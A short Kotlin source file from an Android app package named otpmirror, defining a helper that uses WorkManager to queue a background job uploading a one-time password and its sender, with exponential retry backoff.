package com.pinbridge.otpmirror

import android.content.Context
import androidx.work.*
import java.time.Duration

object OtpUploader {
    private const val TAG = "OtpUpload"

    fun enqueue(context: Context, otp: String, sender: String) {
        val data = workDataOf(
            "otp" to otp,
            "sender" to sender
        )
        val request = OneTimeWorkRequestBuilder<UploadOtpWorker>()
            .setInputData(data)
            .setBackoffCriteria(
                BackoffPolicy.EXPONENTIAL,
                Duration.ofSeconds(30)
            )
            .addTag(TAG)
            .build()
            
        WorkManager.getInstance(context).enqueueUniqueWork(
            "upload_otp",
            ExistingWorkPolicy.APPEND_OR_REPLACE,
            request
        )
    }
}
